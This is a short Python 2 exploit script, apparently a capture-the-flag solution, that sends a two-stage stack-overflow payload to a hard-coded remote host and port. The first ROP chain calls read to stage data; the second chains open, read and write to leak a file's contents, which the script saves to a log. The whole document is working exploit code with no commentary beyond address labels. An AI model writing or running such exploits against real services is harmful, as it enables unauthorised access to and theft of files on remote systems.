import os,sys,struct,socket,binascii,time,re

def exploit():
    sc = "\x00"*0x60
    sc += struct.pack("L",0x00)     
    sc += struct.pack("L",0x0804A040)   #ret
    sc += struct.pack("L",0x0804A040)   #pop ebp
    sc += struct.pack("L",0x08048678)   #call read
    sc += struct.pack("L",0x00)         #fd
    sc += struct.pack("L",0x0804A040)   #buf
    sc += struct.pack("L",0x44)         #count
    sc += struct.pack("L",0x0804A040)
    return sc

def exploit2():
    ex = struct.pack("L",0x0804A040)   #buf    
    ex += struct.pack("L",0x08048420)    #open
    ex += struct.pack("L",0x0804879E)    #call ret
    ex += struct.pack("L",0x080487D0)   #filename
    ex += struct.pack("L",0x00)         #mode
    ex += struct.pack("L",0x080483E0)   #read
    ex += struct.pack("L",0x0804879D)    #call ret
    ex += struct.pack("L",0x03)         #fd
    ex += struct.pack("L",0x0804A0A0)   #buf
    ex += struct.pack("L",0x100)        #count
    ex += struct.pack("L",0x08048450)   #write
    ex += struct.pack("L",0x0804879D)    #call ret
    ex += struct.pack("L",0x01)         #fd
    ex += struct.pack("L",0x0804A0A0)   #buf
    ex += struct.pack("L",0x100)        #count
    ex += struct.pack("L",0x080484B1)   #ret
    return ex

def Log(data):
    file("log",'wb').write(data)

HOST = "210.61.8.96"
PORT = 51342


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
sc = exploit()
s.send(sc)
data = s.recv(0x100)
sc = exploit2()
s.send(sc)
data = s.recv(0x100)
Log(data)
s.close()


